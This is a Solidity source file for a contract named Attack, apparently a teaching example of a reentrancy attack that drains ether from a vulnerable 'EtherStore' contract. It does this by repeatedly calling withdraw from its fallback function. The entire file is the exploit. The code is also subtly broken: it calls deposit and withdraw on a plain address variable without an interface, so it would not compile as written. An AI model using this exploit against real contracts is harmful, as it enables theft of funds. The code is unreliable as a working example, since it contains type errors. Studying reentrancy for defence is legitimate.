// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Attack {


    address public etherStore;


    //When deploying only require to give the First Address of the contract

    constructor(address _etherStoreAddress)

     {
        etherStore = _etherStoreAddress;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

